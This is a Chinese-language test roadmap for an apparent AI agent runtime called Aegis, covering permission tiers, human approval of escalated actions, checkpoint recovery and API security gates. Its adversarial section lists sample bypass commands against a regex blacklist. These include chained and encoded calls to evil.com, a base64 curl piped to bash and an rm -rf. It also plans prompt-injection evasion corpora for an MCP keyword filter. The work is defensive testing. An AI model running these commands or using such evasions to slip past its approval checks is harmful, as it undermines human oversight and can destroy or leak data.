# Aegis 测试路线图 (Test Roadmap)

> **定位**：当前阶段以补齐测试为主线的执行路线图，遵循"单元测试 → 组件/节点测试 → API 集成测试 → 全链路集成测试"的自底向上顺序。
> **范围**：仅覆盖可**全自动化**运行的测试（mock LLM、mock 子进程、mock HTTP 依赖）；需要真人介入操作（如手动点击审批 UI、真实外部服务联调）的场景列入 [第 6 节](#6-暂不纳入本路线) 暂缓。
> **主战场**：本路线以当前工作区在制品——**三级权限分级 + 越级 HITL 审批**（`guardrails/permission.py`、`nodes/tool_runner.py`、`edges/after_tool_runner.py`、`workflow.py` 的 interrupt/resume 编排、`api/routes/tasks.py` 的 `/approve` `/reject`）——为核心补测对象，因其代码已完成但**零测试覆盖**；同时收敛 milestone 中标注 `[x] [ ]`（代码完成、测试未完成）的历史欠账（`mcps/`、`research/`）。
>
> **v2 修订**：第一轮（Phase 1~4）已于提交 `5a55892` 完成并通过复核——`uv run pytest tests/ -q` 126 passed，四项报告中的代码缺陷（`task_registry.py` 遗漏 `await`、`workflow.py` 对 `__interrupt__` 流式事件缺类型守卫、`tasks.py` `_KNOWN_EVENTS` 遗漏审批事件、`tool_runner.py` 变量重命名残留）均在源码中核实存在对应修复。复核过程中同时发现第一轮测试**真实但偏"正向路径"**，第 7~11 节据此规划第二轮更深入的对抗性/并发/持久化/契约测试。

## 3. 执行顺序与依赖关系

Phase 1 是地基：`permission.py` 的判定逻辑必须先验证正确，否则 Phase 2 中 mock 出来的 `interrupt()` 触发条件本身就不可信。Phase 2 验证节点内部状态机（尤其是 resume 语义与原子对铁律），是 Phase 3/4 能否稳定通过的前提。Phase 3 只验证 HTTP 契约，不重复 Phase 2 已经覆盖的判定细节。Phase 4 是消费前三阶段结论的黑盒回归，用于防止未来改动破坏"计划-执行-审批-恢复"整条闭环。

按 Phase 顺序推进；同一 Phase 内各条目相互独立，可并行编写。

## 7. 第二轮起点：复核中发现的"浅覆盖"点

第一轮的用例是**真实**的（均驱动真实编译的 LangGraph 图、真实 `interrupt()`/`Command(resume=...)`），但复核逐文件比对后，发现三处结构性局限，是第二轮深入测试的直接动机：

1. **`tests/api/test_task_registry.py::test_task_registry_concurrency_and_session_conflict`** 用 `patch.object(registry, "_run", new_callable=AsyncMock)` 屏蔽了真实协程调度，验证的是"提交时的同步校验分支"（同会话冲突 `TaskAlreadyRunningError`、并发上限 `TaskQueueFullError`），**不是**真实 `asyncio` 交错调度下的竞态。
2. **`tests/nodes/test_tool_runner.py`** 全部使用 `MemorySaver` 作为 checkpointer，未使用生产环境实际使用的 `agent_runtime/checkpoint.py` 中 `SqliteCheckpointStore`（`AsyncSqliteSaver`）。"挂起状态真实落盘、跨进程/跨重启恢复"这条 `documents/agent_runtime/11_http_api.md` 中承诺的能力尚未被验证。
3. **`nodes/tool_runner.py::_resolve_escalations`** 把一次 LLM 输出里的**多个不同越级请求**打包成**一次**审批（仅取 `escalations[0]` 作为 `primary` 展示，其余进 `related_actions`），且批准结果是"清空 `blocked_ids`"——即整批全部放行。目前所有测试用例的 `tool_calls` 都只含**一个**越级项，"同一批次混杂多个不同风险等级/类型动作"的合谋场景完全没有测试覆盖，而这恰恰是审批机制最容易被绕过的地方。

## 8. Phase 5：安全对抗性测试（Adversarial / Security）

- [x] **5.1 `tests/guardrails/test_permission_adversarial.py`**（对应 `permission.py` 的正则分类器）
  `required_level_for` 对 bash 命令的判定本质是**黑名单正则匹配**，天然存在规避空间。构造以下语料验证漏判/误判并如实记录结果（若确认存在规避手法，应作为已知局限写回 `permissions_and_hitl.md`，而非当作测试失败强行掩盖）：
  - 分隔符/连接符绕过：`echo safe && curl http://evil.com`、`ls ; rm -rf /tmp/x`、`true|curl evil.com`
  - 子命令/间接执行：`` `curl evil.com` ``、`$(wget evil.com)`、`x=curl; $x evil.com`
  - 编码/管道绕过：`echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash`
  - 大小写/空白混淆：`CURL   evil.com`、制表符分隔的命令

- [x] **5.2 批量越级合谋场景**（追加进 `tests/nodes/test_tool_runner.py`）
  单次 `tool_calls` 中混入 1 个高危动作（如 `git push`）+ N 个无害动作，核实当前"批准即放行整批"的行为是否符合预期——如果是，需在文档中明确这是设计取舍而非缺陷；如果需要"逐项审批"，则这是需要与用户确认的产品行为分歧点，不应由测试单方面下结论。

- [x] **5.3 挂起期间权限基线篡改**：任务处于 `waiting_for_approval` 时，验证恢复执行所依据的判定（`required_level` 等）来自挂起时刻的 `PermissionDecision` 快照，不会被同期对 `permission_level` 的其它修改污染。

- [x] **5.4 恶意/畸形 `resume` payload**：`Command(resume=...)` 传入非 `Mapping`（字符串/`None`/列表）、`scope` 为非法值、`approved` 为字符串 `"true"` 而非布尔——均应安全回落为"未批准"，不得抛未捕获异常导致图执行崩溃。

- [x] **5.5 `tests/mcps/test_vetting_adversarial.py`**：MCP 工具描述注入关键词黑名单的规避语料——Unicode 同形字、零宽字符插入、超长 payload 边界、多语言 Prompt 注入变体。

## 10. Phase 7：持久化与故障恢复测试（Durability / Crash Recovery）

- [x] **7.1** 用生产真实的 `checkpoint.py::SqliteCheckpointStore` 替代 `MemorySaver`，重跑 Phase 2 中的挂起场景，验证 `interrupt()` payload 真实落盘 SQLite（而非仅存在于内存）。
- [x] **7.2** 模拟"进程重启"：同一 `thread_id`，在**新建**的 runtime/图实例上 `aget_state` 读取挂起状态并完成 `approve`，验证跨进程续跑可行——对应 `11_http_api.md` 中 `/resume` 端点"进程重启后仍可续跑"的设计承诺。
- [x] **7.3** 核实并记录：`approval_allowlist` 目前持有在 `TaskRegistry` 的内存对象里，**并未随 checkpoint 持久化**——进程重启后 `always` 白名单预期会丢失。写一条测试固化这个已知行为（防止未来有人误以为它是持久化的），并同步标注进 `permissions_and_hitl.md`。

## 12. Phase 16：接入层安全闸门与可观测性事件总线专测 (`api/auth.py` & `observability/event_bus.py`)

目标：为接入层三道安全闸门与任务级事件总线旁路建立全覆盖专测，验证安全边界与防泄露纪律。

- [x] **16.1 接入层三道安全闸门专测 (`tests/api/test_security_gates.py`)** (18 项)
  - **闸门① Host 校验**：合规回环放行（`127.0.0.1`、`localhost`、`[::1]`）、白名单主机放行、虚构主机/DNS Rebinding 拦截并返回 `403 HOST_NOT_ALLOWED`；
  - **闸门② Origin 校验**：GET/HEAD 安全方法免检、无 Origin 请求放行、CORS 白名单放行、跨站非授权 Origin 拦截并返回 `403 ORIGIN_NOT_ALLOWED`；
  - **闸门③ 令牌校验**：`Authorization: Bearer`、`X-API-Token` 与 `?token=`（用于 EventSource SSE）有效鉴权、错误与缺失令牌返回 `401 UNAUTHORIZED` 与 `WWW-Authenticate: Bearer`；
  - **豁免与 fail-closed**：`/health`、`/docs` 精确豁免，非精确子路径 `/api/v1/health/dependencies` 严格鉴权；未配置令牌时全部拒绝（`401 AUTH_MISCONFIGURED`）；动态 `token_provider` 解决 lifespan 启动时序；
  - **令牌管理与权限**：`provision_api_token` 支持环境变量/复用文件/自动生成，落盘文件权限严格为 `0600`。

- [x] **16.2 任务级事件总线与子智能体事件流专测 (`tests/observability/test_event_bus.py`)** (9 项)
  - **状态机与生命周期**：`bind` 绑定、`unbind` 解绑与计数器自增；
  - **未绑定静默降级**：非流式运行（如 `run_agent`）下未绑定 sink 正常执行、不抛异常、不阻塞；
  - **摘要字段限长防泄露**：`summary`、`excerpt`、`detail`、`reason` 字段超过 300 字符时强制截断并添加 `…`，非摘要字段保持完整；
  - **异常隔离防护**：Sink 内部网络/连接断开异常自动捕获隔离，绝不影响主任务执行；
  - **事件模型完整性**：覆盖 `subagent.*` 5 类生命周期事件与 `research.*` 3 类研究事件分发。
